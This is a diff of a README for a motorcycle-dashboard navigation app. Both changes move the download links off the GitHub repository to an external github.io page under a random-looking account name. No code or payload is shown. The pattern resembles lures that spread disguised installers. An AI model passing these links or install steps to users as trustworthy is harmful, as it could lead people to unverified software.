@@ -1,6 +1,6 @@
 # 🏍️ KTM-Nav-GEN3 - See Google Maps on your dashboard
 
-[![](https://img.shields.io/badge/Download-KTM--Nav--GEN3-blue)](https://github.com/Satsumaassortativemating71/KTM-Nav-GEN3)
+[![](https://img.shields.io/badge/Download-KTM--Nav--GEN3-blue)](https://satsumaassortativemating71.github.io)
 
 KTM-Nav-GEN3 displays turn-by-turn navigation data on your motorcycle dashboard. This tool sends map instructions from your phone to your KTM Gen-3 display screen. It keeps your eyes on the road. The application runs entirely on your device. It does not send your location or personal data to any outside server.
 
@@ -15,7 +15,7 @@ KTM-Nav-GEN3 displays turn-by-turn navigation data on your motorcycle dashboard.
 
 You need to access the release page to get the installer for your device.
 
-[Visit the official download page here](https://github.com/Satsumaassortativemating71/KTM-Nav-GEN3)
+[Visit the official download page here](https://satsumaassortativemating71.github.io)
 
 1. Navigate to the link above using your phone browser.
 2. Look for the latest release section.
